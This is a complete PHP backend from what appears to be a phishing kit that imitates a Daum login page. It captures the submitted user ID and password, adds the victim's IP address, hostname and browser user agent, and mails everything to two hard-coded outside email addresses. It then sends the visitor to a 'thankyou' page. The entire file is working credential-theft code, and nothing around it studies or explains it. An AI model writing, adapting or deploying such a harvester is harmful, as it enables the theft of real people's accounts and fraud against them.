<?php
if($_POST["userid"] != "" and $_POST["formtext2"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Daum Info-----------------------\n";
$message .= "USER ID        : ".$_POST['userid']."\n";
$message .= "PASSWORD         : ".$_POST['formtext2']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- Burhan FUDPAGE [.] COM --------------|\n";
$send = "donshaffy2@gmail.com,info.shimalayastartradingco@yandex.com";
$subject = "Login | $ip";
{
mail("$send", "$subject", $message);   
}
  header ("Location: thankyou.html");
}else{
header ("Location: index.php");
}

?>